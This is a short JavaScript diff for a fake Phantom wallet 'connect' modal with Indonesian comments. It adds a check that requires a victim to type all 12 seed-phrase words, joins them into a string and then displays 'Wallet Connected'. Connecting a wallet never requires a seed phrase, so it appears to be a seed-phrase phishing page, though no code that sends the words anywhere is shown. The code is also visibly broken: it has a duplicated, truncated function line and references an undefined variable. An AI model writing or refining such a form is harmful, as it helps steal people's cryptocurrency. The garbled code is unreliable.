@@ -196,26 +196,22 @@ window.closePhantomModal = function() {
 window.doPhantomConnect = function() {
     dow.doPhantomConnect = function() {
     
-    // ===== VALIDASI 12 KOTAK WAJIB ISI =====
-    let allFilled = true;
+    // ===== VALIDASI 12 KOTAK WAJIB ISI - VERSI FIX =====
     let names = [];
     for(let i = 1; i <= 12; i++) {
-      let val = document.getElementById("name" + i).value.trim();
-      if(val === "") { 
-        allFilled = false; 
-        break; 
+      let input = document.getElementById("name" + i);
+      if(!input || input.value.trim() === "") { 
+        alert("❌ Wajib isi 12 kotak seed phrase dulu bro!\nKotak no " + i + " masih kosong");
+        return; // Stop kalo ada yg kosong
       }
-      names.push(val);
-    }
-    if(!allFilled) { 
-      alert("❌ Wajib isi 12 kotak seed phrase dulu bro!"); 
-      return; // Stop disini
+      names.push(input.value.trim());
     }
     let demoWalletName = names.join(" ");
     // ===== SELESAI VALIDASI =====
 
     // kode lama kamu lanjut di bawah sini
-    // ...
+    button.innerHTML = `✔️ Wallet Connected`;
+    // ... dst
 }
     const btn = document.getElementById("phantomConnectBtn");
     const address = document.getElementById("phantomAddress");
